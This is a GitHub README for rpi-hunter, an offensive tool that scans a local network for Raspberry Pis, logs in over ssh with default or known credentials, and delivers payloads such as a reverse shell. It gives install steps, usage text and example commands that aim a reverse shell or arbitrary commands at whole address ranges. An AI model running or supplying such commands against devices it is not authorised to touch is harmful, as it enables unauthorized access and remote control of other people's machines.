# rpi-hunter
* Automate discovering and dropping payloads on LAN Raspberry Pi's via ssh
* Or, the honest title: Automating sshpass for command delivery.


![alt text](https://github.com/BusesCanFly/rpi-hunter/blob/master/screenshot.png "Who doesn't love ASCII art?")

Rpi-hunter is  useful when there are multiple Raspberry Pi's on your LAN with default or known credentials, in order to automate sending commands/payloads to them.

# GUIDE:

## Installation

1. Install dependencies: `sudo pip install -U argparse termcolor` and `sudo apt -y install arp-scan tshark sshpass`
2. Download rpi-hunter: `git clone https://github.com/BusesCanFly/rpi-hunter`
3. Navigate to rpi-hunter: `cd ./rpi-hunter`
4. Make rpi-hunter.py executable: `chmod +x rpi-hunter.py`
* One line variant: `sudo pip install -U argparse termcolor && sudo apt -y install arp-scan tshark sshpass && git clone https://github.com/BusesCanFly/rpi-hunter && cd ./rpi-hunter && chmod +x rpi-hunter.py`

## Usage

Check out this sweet video made by the people over at NullByte!
![Video](https://www.youtube.com/watch?v=qApJyIkDYvQ)
And the accompanying [write-up](https://null-byte.wonderhowto.com/how-to/discover-attack-raspberry-pis-using-default-credentials-with-rpi-hunter-0193855/)

	* Note: For the new people, I made a few updates to rpi-hunter to fix some bugs and add some more features :) Running the command `./rpi-hunter.py` will automatically scan your whole local network and run the `whoami` command on any raspberry pi's it finds

```
usage: rpi-hunter.py [-h] [--list] [--no-scan] [-r IP_RANGE] [-f IP_LIST]
                     [-c CREDS] [--payload PAYLOAD] [-H HOST] [-P PORT]
                     [--safe] [-q]

optional arguments:
  -h, --help         show this help message and exit
  --list             List available payloads
  --no-scan          Disable ARP scanning
  -r IP_RANGE        IP range to scan
  -f IP_LIST         IP list to use (Default ./scan/RPI_list)
  -u UNAME           Username to use when ssh'ing
  -c CREDS           Password to use when ssh'ing
  --payload PAYLOAD  (Name of, or raw) Payload [ex. reverse_shell or 'whoami']
  -H HOST            (If using reverse_shell payload) Host for reverse shell
  -P PORT            (If using reverse_shell payload) Port for reverse shell
  --safe             Print sshpass command, but don't execute it
  -q                 Don't print banner
```

* Run `./rpi-hunter.py --list` to see avalible payloads.
* Payloads can be specified by the payload name from `--list` or as raw input
    * ex. `--payload reverse_shell` or `--payload [your cli command here]`

* Example usage: 
	* `./rpi-hunter.py -r 192.168.0.0/16 --payload reverse_shell -H 127.0.0.1 -P 1337`
	* `./rpi-hunter.py -r 192.168.2.0/16 -c lamepassword --payload "ls -lah \~"`

## Disclaimer
## The standard internet fun disclaimer applies. Don't commit crimes, be responsible.

## I am in no way responsible for anything and everything you do with rpi-hunter.

